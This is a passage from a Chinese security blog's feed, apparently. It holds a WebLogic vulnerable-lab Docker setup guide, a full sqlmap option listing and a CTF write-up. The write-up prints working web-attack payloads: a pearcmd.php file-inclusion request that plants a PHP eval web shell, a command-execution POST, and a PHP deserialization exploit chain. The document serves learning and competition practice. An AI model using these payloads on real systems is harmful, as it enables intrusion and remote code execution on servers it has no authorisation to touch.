class="operator">||</span> <span class="number">0</span>;  <span class="comment">-- 结果为 1</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">常规注入类,盲注类</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>weblogic 靶场搭建</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/391bc7c.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/391bc7c.html</id>
    <published>2024-08-07T10:47:00.000Z</published>
    <updated>2024-08-07T10:50:15.351Z</updated>
    
    <content type="html"><![CDATA[<hr><blockquote><p>都是参考奇安信team写的脚本,脚本地址如下:</p></blockquote><p><a href="https://github.com/QAX-A-Team/WeblogicEnvironment/tree/master?tab=readme-ov-file">QAX-A-Team/WeblogicEnvironment: Weblogic环境搭建工具 (github.com)</a></p><p>感谢大佬写的脚本,再次感谢issue里面老哥踩坑的记录哈哈哈哈哈,一进去就看到了~</p><hr><h1 id="Weblogic环境搭建工具"><a href="#Weblogic环境搭建工具" class="headerlink" title="Weblogic环境搭建工具"></a>Weblogic环境搭建工具</h1><p>Weblogic环境搭建过程很繁琐，很多时候需要测试各种Weblogic版本和各种JDK版本的排列组合，因此我写了一个脚本级别的Weblogic环境搭建工具，用于安全研究时节省大家搭建环境的时间。 此环境搭建工具使用Docker和shell脚本，因此需要本机安装Docker才可以使用。经测试漏洞搭建工具可以在3分钟内构建出任意JDK版本搭配任意Weblogic版本，包含一个可远程调试的已启动的Weblogic Server域环境。</p><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><ul><li>自动化安装任意版本JDK</li><li>自动化安装任意版本Weblogic Server</li><li>自动化创建域</li><li>自动打开远程调试</li><li>自动启动一个Weblogic Server域</li></ul><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><img src="https://gitee.com/eviden/img/raw/master/202408071841299.png" alt=""></p><h2 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h2><h3 id="下载JDK安装包和Weblogic安装包"><a href="#下载JDK安装包和Weblogic安装包" class="headerlink" title="下载JDK安装包和Weblogic安装包"></a>下载JDK安装包和Weblogic安装包</h3><p>下载相应的JDK版本和Weblogic安装包，将JDK安装包放到<code>jdks/</code>目录下，将Weblogic安装包放到<code>weblogics/</code>目录下。<strong>此步骤必须手动操作，否则无法进行后续步骤。</strong></p><p><img src="https://gitee.com/eviden/img/raw/master/202408071842315.png" alt=""></p><p><img src="https://gitee.com/eviden/img/raw/master/202408071842317.png" alt=""></p><p>JDK安装包下载地址：<a href="https://www.oracle.com/technetwork/java/javase/archive-139210.html">https://www.oracle.com/technetwork/java/javase/archive-139210.html</a> Weblogic安装包下载地址：<a href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html">https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html</a></p><h3 id="构建镜像并运行"><a href="#构建镜像并运行" class="headerlink" title="构建镜像并运行"></a>构建镜像并运行</h3><p>回到根目录，执行Docker构建镜像命令：</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build --build-arg JDK_PKG=&lt;YOUR-JDK-PACKAGE-<span class="keyword">FILE</span>-<span class="keyword">NAME</span>&gt; --build-arg WEBLOGIC_JAR=&lt;YOUR-WEBLOGIC-PACKAGE-<span class="keyword">FILE</span>-<span class="keyword">NAME</span>&gt;  -t &lt;DOCKER-IMAGE-<span class="keyword">NAME</span>&gt; .</span><br></pre></td></tr></table></figure><p>镜像构建完成后，执行以下命令运行：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> run -d -p <span class="number">7001</span>:<span class="number">7001</span> -p <span class="number">8453</span>:<span class="number">8453</span> -p <span class="number">5556</span>:<span class="number">5556</span> --name &lt;CONTAINER-NAME&gt; &lt;DOCKER-IMAGE-NAME-YOU-JUST-BUILD&gt;</span><br></pre></td></tr></table></figure><p>以Weblogic12.1.3配JDK 7u21为例，构建镜像命令如下：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">build </span>--<span class="keyword">build-arg </span><span class="keyword">JDK_PKG=jdk-7u21-linux-x64.tar.gz </span>--<span class="keyword">build-arg </span>WEBLOGIC_JAR=fmw_12.<span class="number">1</span>.<span class="number">3</span>.<span class="number">0</span>.<span class="number">0</span>_wls.<span class="keyword">jar </span> -t weblogic12013jdk7u21 .</span><br></pre></td></tr></table></figure><p>镜像构建完成后，执行以下命令运行：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> run -d -p <span class="number">7001</span>:<span class="number">7001</span> -p <span class="number">8453</span>:<span class="number">8453</span> -p <span class="number">5556</span>:<span class="number">5556</span> --name weblogic12013jdk7u21 weblogic12013jdk7u21</span><br></pre></td></tr></table></figure><p>运行后可访问<code>http://localhost:7001/console/login/LoginForm.jsp</code>登录到Weblogic Server管理控制台，默认用户名为<code>weblogic</code>,默认密码为<code>qaxateam01</code></p><h3 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h3><p>如需远程调试，需使用<code>docker cp</code>将远程调试需要的目录从已运行的容器复制到本机。</p><p>也可以使用<code>run_weblogic1036jdk6u25.sh</code>、<code>run_weblogic12013jdk7u21sh</code>、<code>run_weblogic12021jdk8u121.sh</code>这三个脚本进行快速环境搭建并复制远程调试需要用到的目录。执行前请赋予它们相应的可执行权限</p><p><img src="https://gitee.com/eviden/img/raw/master/202408071843351.png" alt=""></p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>以JDK 7u21配合Weblogic 12.1.3为例，自动搭建效果如上：</p><hr><h2 id="以下是注意事项"><a href="#以下是注意事项" class="headerlink" title="以下是注意事项"></a>以下是注意事项</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用的是kali linux or 其他linux</span><br><span class="line">参考https:<span class="regexp">//</span>developer.aliyun.com<span class="regexp">/article/</span><span class="number">521649</span>安装docker并加速(docker被ban自己解决!)</span><br><span class="line">按照说明创建指定的目录并拖入jdk及weblogic文件</span><br><span class="line">主要需要修改的是Dockerfile文件</span><br></pre></td></tr></table></figure><p>修改(dockerfile)文件以下内容</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">FROM</span> centos</span><br><span class="line"><span class="selector-tag">FROM</span> centos:centos7</span><br></pre></td></tr></table></figure><p>注释掉以下内容</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 解决libnsl包丢失的问题</span></span><br><span class="line"><span class="meta">#RUN yum -y install libnsl</span></span><br></pre></td></tr></table></figure><p>不然   <code>RUN yum -y install libnsl</code> 会报错</p>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;都是参考奇安信team写的脚本,脚本地址如下:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/QAX-A-Team/WeblogicEnvironment/tree/master?tab</summary>
      
    
    
    
    <category term="靶场复现" scheme="https://github.com/Eviden0/new-webpage/categories/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Weblogic" scheme="https://github.com/Eviden0/new-webpage/tags/Weblogic/"/>
    
  </entry>
  
  <entry>
    <title>Usage for Bestsqlmap</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/4be0fbb2.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/4be0fbb2.html</id>
    <published>2024-08-05T23:35:00.000Z</published>
    <updated>2024-08-05T23:40:28.979Z</updated>
    
    <content type="html"><![CDATA[<p>Usage: python sqlmap.py [options]</p><p>Options:<br>  -h, —help            Show basic help message and exit<br>  -hh                   Show advanced help message and exit<br>  —version             Show program’s version number and exit<br>  -v VERBOSE            Verbosity level: 0-6 (default 1)</p><p>  Target:<br>    At least one of these options has to be provided to define the<br>    target(s)</p><pre><code>-u URL, --url=URL   Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)-d DIRECT           Connection string for direct database connection-l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file-m BULKFILE         Scan multiple targets given in a textual file-r REQUESTFILE      Load HTTP request from a file-g GOOGLEDORK       Process Google dork results as target URLs-c CONFIGFILE       Load options from a configuration INI file</code></pre><p>  Request:<br>    These options can be used to specify how to connect to the target URL</p><pre><code>-A AGENT, --user..  HTTP User-Agent header value-H HEADER, --hea..  Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)--method=METHOD     Force usage of given HTTP method (e.g. PUT)--data=DATA         Data string to be sent through POST (e.g. &quot;id=1&quot;)--param-del=PARA..  Character used for splitting parameter values (e.g. &amp;)--cookie=COOKIE     HTTP Cookie header value (e.g. &quot;PHPSESSID=a8d127e..&quot;)--cookie-del=COO..  Character used for splitting cookie values (e.g. ;)--live-cookies=L..  Live cookies file used for loading up-to-date values--load-cookies=L..  File containing cookies in Netscape/wget format--drop-set-cookie   Ignore Set-Cookie header from response--mobile            Imitate smartphone through HTTP User-Agent header--random-agent      Use randomly selected HTTP User-Agent header value--host=HOST         HTTP Host header value--referer=REFERER   HTTP Referer header value--headers=HEADERS   Extra headers (e.g. &quot;Accept-Language: fr\nETag: 123&quot;)--auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)--auth-cred=AUTH..  HTTP authentication credentials (name:password)--auth-file=AUTH..  HTTP authentication PEM cert/private key file--ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401)--ignore-proxy      Ignore system default proxy settings--ignore-redirects  Ignore redirection attempts--ignore-timeouts   Ignore connection timeouts--proxy=PROXY       Use a proxy to connect to the target URL--proxy-cred=PRO..  Proxy authentication credentials (name:password)--proxy-file=PRO..  Load proxy list from a file--proxy-freq=PRO..  Requests between change of proxy from a given list--tor               Use Tor anonymity network--tor-port=TORPORT  Set Tor proxy port other than default--tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))--check-tor         Check to see if Tor is used properly--delay=DELAY       Delay in seconds between each HTTP request--timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)--retries=RETRIES   Retries when the connection timeouts (default 3)--randomize=RPARAM  Randomly change value for given parameter(s)--safe-url=SAFEURL  URL address to visit frequently during testing--safe-post=SAFE..  POST data to send to a safe URL--safe-req=SAFER..  Load safe HTTP request from a file--safe-freq=SAFE..  Regular requests between visits to a safe URL--skip-urlencode    Skip URL encoding of payload data--csrf-token=CSR..  Parameter used to hold anti-CSRF token--csrf-url=CSRFURL  URL address to visit for extraction of anti-CSRF token--csrf-method=CS..  HTTP method to use during anti-CSRF token page visit--csrf-retries=C..  Retries for anti-CSRF token retrieval (default 0)--force-ssl         Force usage of SSL/HTTPS--chunked           Use HTTP chunked transfer encoded (POST) requests--hpp               Use HTTP parameter pollution method--eval=EVALCODE     Evaluate provided Python code before the request (e.g.                    &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)</code></pre><p>  Optimization:<br>    These options can be used to optimize the performance of sqlmap</p><pre><code>-o                  Turn on all optimization switches--predict-output    Predict common queries output--keep-alive        Use persistent HTTP(s) connections--null-connection   Retrieve page length without actual HTTP response body--threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)</code></pre><p>  Injection:<br>    These options can be used to specify which parameters to test for,<br>    provide custom injection payloads and optional tampering scripts</p><pre><code>-p TESTPARAMETER    Testable parameter(s)--skip=SKIP         Skip testing for given parameter(s)--skip-static       Skip testing parameters that not appear to be dynamic--param-exclude=..  Regexp to exclude parameters from testing (e.g. &quot;ses&quot;)--param-filter=P..  Select testable parameter(s) by place (e.g. &quot;POST&quot;)--dbms=DBMS         Force back-end DBMS to provided value--dbms-cred=DBMS..  DBMS authentication credentials (user:password)--os=OS             Force back-end DBMS operating system to provided value--invalid-bignum    Use big numbers for invalidating values--invalid-logical   Use logical operations for invalidating values--invalid-string    Use random strings for invalidating values--no-cast           Turn off payload casting mechanism--no-escape         Turn off string escaping mechanism--prefix=PREFIX     Injection payload prefix string--suffix=SUFFIX     Injection payload suffix string--tamper=TAMPER     Use given script(s) for tampering injection data</code></pre><p>  Detection:<br>    These options can be used to customize the detection phase</p><pre><code>--level=LEVEL       Level of tests to perform (1-5, default 1)--risk=RISK         Risk of tests to perform (1-3, default 1)--string=STRING     String to match when query is evaluated to True--not-string=NOT..  String to match when query is evaluated to False--regexp=REGEXP     Regexp to match when query is evaluated to True--code=CODE         HTTP code to match when query is evaluated to True--smart             Perform thorough tests only if positive heuristic(s)--text-only         Compare pages based only on the textual content--titles            Compare pages based only on their titles</code></pre><p>  Techniques:<br>    These options can be used to tweak testing of specific SQL injection<br>    techniques</p><pre><code>--technique=TECH..  SQL injection techniques to use (default &quot;BEUSTQ&quot;)--time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)--union-cols=UCOLS  Range of columns to test for UNION query SQL injection--union-char=UCHAR  Character to use for bruteforcing number of columns--union-from=UFROM  Table to use in FROM part of UNION query SQL injection--dns-domain=DNS..  Domain name used for DNS exfiltration attack--second-url=SEC..  Resulting page URL searched for second-order response--second-req=SEC..  Load second-order HTTP request from file</code></pre><p>  Fingerprint:<br>    -f, —fingerprint   Perform an extensive DBMS version fingerprint</p><p>  Enumeration:<br>    These options can be used to enumerate the back-end database<br>    management system information, structure and data contained in the<br>    tables</p><pre><code>-a, --all           Retrieve everything-b, --banner        Retrieve DBMS banner--current-user      Retrieve DBMS current user--current-db        Retrieve DBMS current database--hostname          Retrieve DBMS server hostname--is-dba            Detect if the DBMS current user is DBA--users             Enumerate DBMS users--passwords         Enumerate DBMS users password hashes--privileges        Enumerate DBMS users privileges--roles             Enumerate DBMS users roles--dbs               Enumerate DBMS databases--tables            Enumerate DBMS database tables--columns           Enumerate DBMS database table columns--schema            Enumerate DBMS schema--count             Retrieve number of entries for table(s)--dump              Dump DBMS database table entries--dump-all          Dump all DBMS databases tables entries--search            Search column(s), table(s) and/or database name(s)--comments          Check for DBMS comments during enumeration--statements        Retrieve SQL statements being run on DBMS-D DB               DBMS database to enumerate-T TBL              DBMS database table(s) to enumerate-C COL              DBMS database table column(s) to enumerate-X EXCLUDE          DBMS database identifier(s) to not enumerate-U USER             DBMS user to enumerate--exclude-sysdbs    Exclude DBMS system databases when enumerating tables--pivot-column=P..  Pivot column name--where=DUMPWHERE   Use WHERE condition while table dumping--start=LIMITSTART  First dump table entry to retrieve--stop=LIMITSTOP    Last dump table entry to retrieve--first=FIRSTCHAR   First query output word character to retrieve--last=LASTCHAR     Last query output word character to retrieve--sql-query=SQLQ..  SQL statement to be executed--sql-shell         Prompt for an interactive SQL shell--sql-file=SQLFILE  Execute SQL statements from given file(s)</code></pre><p>  Brute force:<br>    These options can be used to run brute force checks</p><pre><code>--common-tables     Check existence of common tables--common-columns    Check existence of common columns--common-files      Check existence of common files</code></pre><p>  User-defined function injection:<br>    These options can be used to create custom user-defined functions</p><pre><code>--udf-inject        Inject custom user-defined functions--shared-lib=SHLIB  Local path of the shared library</code></pre><p>  File system access:<br>    These options can be used to access the back-end database management<br>    system underlying file system</p><pre><code>--file-read=FILE..  Read a file from the back-end DBMS file system--file-write=FIL..  Write a local file on the back-end DBMS file system--file-dest=FILE..  Back-end DBMS absolute filepath to write to</code></pre><p>  Operating system access:<br>    These options can be used to access the back-end database management<br>    system underlying operating system</p><pre><code>--os-cmd=OSCMD      Execute an operating system command--os-shell          Prompt for an interactive operating system shell--os-pwn            Prompt for an OOB shell, Meterpreter or VNC--os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC--os-bof            Stored procedure buffer overflow exploitation--priv-esc          Database process user privilege escalation--msf-path=MSFPATH  Local path where Metasploit Framework is installed--tmp-path=TMPPATH  Remote absolute path of temporary files directory</code></pre><p>  Windows registry access:<br>    These options can be used to access the back-end database management<br>    system Windows registry</p><pre><code>--reg-read          Read a Windows registry key value--reg-add           Write a Windows registry key value data--reg-del           Delete a Windows registry key value--reg-key=REGKEY    Windows registry key--reg-value=REGVAL  Windows registry key value--reg-data=REGDATA  Windows registry key value data--reg-type=REGTYPE  Windows registry key value type</code></pre><p>  General:<br>    These options can be used to set some general working parameters</p><pre><code>-s SESSIONFILE      Load session from a stored (.sqlite) file-t TRAFFICFILE      Log all HTTP traffic into a textual file--answers=ANSWERS   Set predefined answers (e.g. &quot;quit=N,follow=N&quot;)--base64=BASE64P..  Parameter(s) containing Base64 encoded data--base64-safe       Use URL and filename safe Base64 alphabet (RFC 4648)--batch             Never ask for user input, use the default behavior--binary-fields=..  Result fields having binary values (e.g. &quot;digest&quot;)--check-internet    Check Internet connection before assessing the target--cleanup           Clean up the DBMS from sqlmap specific UDF and tables--crawl=CRAWLDEPTH  Crawl the website starting from the target URL--crawl-exclude=..  Regexp to exclude pages from crawling (e.g. &quot;logout&quot;)--csv-del=CSVDEL    Delimiting character used in CSV output (default &quot;,&quot;)--charset=CHARSET   Blind SQL injection charset (e.g. &quot;0123456789abcdef&quot;)--dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)--encoding=ENCOD..  Character encoding used for data retrieval (e.g. GBK)--eta               Display for each output the estimated time of arrival--flush-session     Flush session files for current target--forms             Parse and test forms on target URL--fresh-queries     Ignore query results stored in session file--gpage=GOOGLEPAGE  Use Google dork results from specified page number--har=HARFILE       Log all HTTP traffic into a HAR file--hex               Use hex conversion during data retrieval--output-dir=OUT..  Custom output directory path--parse-errors      Parse and display DBMS error messages from responses--preprocess=PRE..  Use given script(s) for preprocessing (request)--postprocess=PO..  Use given script(s) for postprocessing (response)--repair            Redump entries having unknown character marker (?)--save=SAVECONFIG   Save options to a configuration INI file--scope=SCOPE       Regexp for filtering targets--skip-heuristics   Skip heuristic detection of SQLi/XSS vulnerabilities--skip-waf          Skip heuristic detection of WAF/IPS protection--table-prefix=T..  Prefix used for temporary tables (default: &quot;sqlmap&quot;)--test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)--test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)--web-root=WEBROOT  Web server document root directory (e.g. &quot;/var/www&quot;)</code></pre><p>  Miscellaneous:<br>    These options do not fit into any other category</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-z MNEMONICS        Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;)</span><br><span class="line">--alert=ALERT       Run host OS command(s) when SQL injection is found</span><br><span class="line">--beep              Beep on question and/or when SQLi/XSS/FI is found</span><br><span class="line">--dependencies      Check for missing (optional) sqlmap dependencies</span><br><span class="line">--disable-coloring  Disable console output coloring</span><br><span class="line">--list-tampers      Display list of available tamper scripts</span><br><span class="line">--offline           Work in offline mode (only use session data)</span><br><span class="line">--purge             Safely remove all content from sqlmap data directory</span><br><span class="line">--results-file=R..  Location of CSV results file in multiple targets mode</span><br><span class="line">--shell             Prompt for an interactive sqlmap shell</span><br><span class="line">--tmp-dir=TMPDIR    Local directory for storing temporary files</span><br><span class="line">--unstable          Adjust options for unstable connections</span><br><span class="line">--update            Update sqlmap</span><br><span class="line">--wizard            Simple wizard interface for beginner users</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Usage for sqlmap</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>武功山杯初赛</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/5184866e.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/5184866e.html</id>
    <published>2024-07-24T16:00:00.000Z</published>
    <updated>2024-07-25T22:57:11.144Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>date: 2024-7-25</p><p>author/team: 赛博保安</p></blockquote><hr><blockquote><p>驴友小镇</p></blockquote><p><img src="https://gitee.com/eviden/img/raw/master/202407251613026.png" alt="image-20240725161345705"></p><p><img src="https://gitee.com/eviden/img/raw/master/202407251614114.png" alt="image-20240725161424862"></p><blockquote><p>龙溪秘境</p></blockquote><p>bp爆破得到账号密码:<br>test:654321(ps:密码base64编码)<br><img src="https://gitee.com/eviden/img/raw/master/202407251616491.png" alt="image-20240725161630181"></p><blockquote><p>武功论剑</p></blockquote><p>开题源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no way&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>pearcmd文件包含</strong></p><p>手写一个🐎子进去<code>?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&lt;?=eval($_POST[c]);?&gt;+/tmp/shell.php</code></p><p>然后访问:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/source.php?file=/tmp/shell.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>59.62.61.30:45255</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>19</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">c</span><span class="operator">=</span>system(<span class="string">&quot;tac /flag&quot;</span>)<span class="comment">;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/202407251621343.png" alt="image-20240725162102201"></p><blockquote><p>石能为鼓</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ping</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$xiang</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;xiang = <span class="keyword">new</span> <span class="title function_ invoke__">fun</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;xiang-&gt;<span class="title function_ invoke__">cp</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fun</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">cp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cup</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">cp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简简单单反序列化<br>EXP:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ping</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$xiang</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xiang</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;xiang = <span class="variable">$xiang</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cup</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cup</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cup</span>(<span class="string">&quot;system(&#x27;cat /fl*&#x27;);&quot;</span>);</span><br><span class="line"><span class="variable">$ping</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ping</span>(<span class="variable">$cup</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$ping</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//O%3A4%3A%22ping%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00xiang%22%3BO%3A3%3A%22cup%22%3A1%3A%7Bs%3A9%3A%22%00cup%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>萍水相逢</p></blockquote><p>貌似是原题:<br>搜到题解,<strong>拿来主义咯!</strong>!</p><p><code>https://fanygit.github.io/2021/08/22/[web]%E4%B8%80%E9%81%93TimelineSec%E5%9B%A2%E9%98%9F%E5%85%A5%E9%98%9F%E9%A2%98/</code></p><p>EXP:<strong>?code=’input’(‘cmd’)(‘input’(‘value’));&amp;cmd=system&amp;value=/readflag </strong>  